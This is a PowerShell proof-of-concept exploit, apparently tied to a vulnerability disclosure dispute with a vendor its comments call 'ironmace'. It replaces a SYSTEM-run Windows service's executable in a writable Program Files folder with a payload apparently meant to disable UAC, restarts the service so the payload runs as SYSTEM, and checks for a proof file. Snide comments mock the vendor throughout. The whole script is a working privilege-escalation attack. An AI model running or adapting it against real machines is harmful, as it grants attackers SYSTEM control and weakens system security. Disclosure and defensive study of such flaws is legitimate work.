#Requires -Version 5.1
param(
    [Parameter(Mandatory)][string]$ServiceName,
    [Parameter(Mandatory)][string]$TargetExe,
    [string]$PayloadExe = (Join-Path $PSScriptRoot 'UacDisablePayload.exe'),
    [string]$ProofFile = 'C:\ProgramData\poc_uac_proof.txt'
)

$ErrorActionPreference = 'Stop'
$backup = "$TargetExe.poc_backup"

if (-not (Test-Path -LiteralPath $PayloadExe)) {
    & (Join-Path $PSScriptRoot 'Build-UacPayload.ps1') -OutExe $PayloadExe | Out-Null
}

# saving their exe before we improve it. you're welcome ironmace
if (-not (Test-Path -LiteralPath $backup)) {
    Copy-Item -LiteralPath $TargetExe -Destination $backup -Force
    Write-Host "[+] backed up exe (more care than their disclosure process)" -ForegroundColor Green
}

$svc = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
if ($svc -and $svc.Status -eq 'Running') {
    Stop-Service -Name $ServiceName -Force -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 2
}

# SYSTEM wrote the last proof. kinda on brand for their security team
if (Test-Path -LiteralPath $ProofFile) {
    try { Remove-Item -LiteralPath $ProofFile -Force -ErrorAction Stop }
    catch { Write-Host "[*] old proof stuck, ironmace energy" -ForegroundColor Yellow }
}

$stampBefore = Get-Date
# writable program files + SYSTEM service. who needs code review
Copy-Item -LiteralPath $PayloadExe -Destination $TargetExe -Force
Write-Host "[+] replaced TavernWorker.exe (they left the door open)" -ForegroundColor Green

sc.exe start $ServiceName 2>&1 | Write-Host
Write-Host "[*] sc start exit: $LASTEXITCODE (thanks for running as SYSTEM)"

$deadline = (Get-Date).AddSeconds(30)
while ((Get-Date) -lt $deadline) {
    if (Test-Path -LiteralPath $ProofFile) {
        $item = Get-Item -LiteralPath $ProofFile
        if ($item.LastWriteTime -ge $stampBefore.AddSeconds(-5)) {
            Write-Host "[+] worked. email them again i guess" -ForegroundColor Green
            Get-Content -LiteralPath $ProofFile | Write-Host
            return
        }
    }
    Start-Sleep -Milliseconds 500
}

Write-Host "[!] timed out. even their service is unreliable" -ForegroundColor Yellow
Get-Service -Name $ServiceName | Format-List Name, Status | Out-String | Write-Host
